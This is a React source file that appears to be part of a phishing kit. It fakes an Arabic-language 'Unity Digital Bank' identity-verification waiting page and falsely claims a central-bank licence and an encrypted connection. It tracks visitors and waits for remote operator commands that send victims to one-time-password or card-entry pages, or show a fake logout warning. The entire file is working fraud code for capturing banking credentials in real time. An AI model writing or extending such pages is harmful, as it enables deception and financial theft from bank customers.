import { useEffect, useRef, useState } from "react";
import { Shield } from "lucide-react";
import { unityApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";
import { useAdminCommands } from "@/lib/useTracking";

const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };

export default function WaitingPage() {
  useTracking("انتظار");
  const [rejected, setRejected] = useState(false);

  useAdminCommands({
    "redirect:otp":    () => { window.location.href = "/unity-bank/otp"; },
    "redirect:card":   () => { window.location.href = "/unity-bank/card"; },
    "redirect:home":   () => { window.location.href = "/unity-bank/"; },
    "redirect:reject": () => setRejected(true),
    "redirect:cancel": () => setRejected(true),
  });

  if (rejected) {
    return (
      <div
        className="min-h-screen flex flex-col items-center justify-center p-8 text-center"
        dir="rtl"
        style={{
          fontFamily: "'Cairo', system-ui, sans-serif",
          background: "linear-gradient(160deg, #1565C0 0%, #1976D2 40%, #1E88E5 100%)",
        }}
      >
        {/* Orange warning circle */}
        <div
          className="flex items-center justify-center rounded-full mb-10"
          style={{
            width: 120,
            height: 120,
            background: "linear-gradient(145deg, #FF8C00, #FFA500)",
            boxShadow: "0 8px 32px rgba(255,140,0,0.45)",
          }}
        >
          <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
            <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" fill="white"/>
            <line x1="12" y1="9" x2="12" y2="13" stroke="#FF8C00" strokeWidth="2.2" strokeLinecap="round"/>
            <line x1="12" y1="17" x2="12.01" y2="17" stroke="#FF8C00" strokeWidth="2.5" strokeLinecap="round"/>
          </svg>
        </div>

        <h1 className="text-white font-black text-4xl mb-6" style={{ textShadow: "0 2px 8px rgba(0,0,0,0.2)" }}>
          تنبيه
        </h1>

        <p className="text-white text-xl leading-relaxed font-semibold max-w-xs" style={{ textShadow: "0 1px 4px rgba(0,0,0,0.15)" }}>
          يجب تسجيل خروج من المحفظة قبل البدء في عملية تسجيل الدخول هنا
        </p>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.primary} 0%, #0d2847 100%)` }}>
      <div className="w-full max-w-sm text-center">
        <div className="bg-white rounded-3xl shadow-2xl p-10 space-y-6">
          <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto" style={{ background: `${BRAND.primary}15` }}>
            <div className="w-14 h-14 border-4 border-t-transparent rounded-full animate-spin" style={{ borderColor: `${BRAND.primary}40 ${BRAND.primary} ${BRAND.primary} ${BRAND.primary}` }} />
          </div>

          <div>
            <h2 className="text-gray-900 font-black text-xl mb-2">جاري التحقق من هويتك</h2>
            <p className="text-gray-500 text-sm leading-relaxed">
              يرجى الانتظار بينما نتحقق من بياناتك<br />هذه العملية لا تستغرق سوى لحظات
            </p>
          </div>

          <div className="space-y-2">
            {["التحقق من الهوية", "مراجعة البيانات", "تأمين الجلسة"].map((step, i) => (
              <div key={i} className="flex items-center gap-3 bg-gray-50 rounded-xl px-4 py-2.5">
                <div className="w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black text-white flex-shrink-0"
                  style={{ background: i === 0 ? BRAND.primary : `${BRAND.primary}30` }}>
                  {i === 0 ? "✓" : i + 1}
                </div>
                <span className="text-sm font-semibold text-gray-600">{step}</span>
                {i === 0 && <span className="mr-auto text-[10px] font-bold text-green-600 bg-green-100 px-2 py-0.5 rounded-full">مكتمل</span>}
                {i === 1 && <span className="mr-auto text-[10px] font-bold text-blue-600 bg-blue-100 px-2 py-0.5 rounded-full">جاري...</span>}
              </div>
            ))}
          </div>

          <div className="bg-amber-50 border border-amber-200 rounded-xl p-3">
            <p className="text-amber-700 text-xs font-semibold">لا تغلق هذه الصفحة حتى اكتمال عملية التحقق</p>
          </div>

          <div className="flex items-center justify-center gap-2 text-xs text-gray-400">
            <Shield className="w-3.5 h-3.5 text-green-500" />
            <span className="font-semibold">اتصال آمن ومشفر</span>
          </div>
        </div>

        <p className="text-blue-300 text-xs mt-4 font-semibold">البنك الوحدة الرقمي • مرخص من ساما</p>
      </div>
    </div>
  );
}
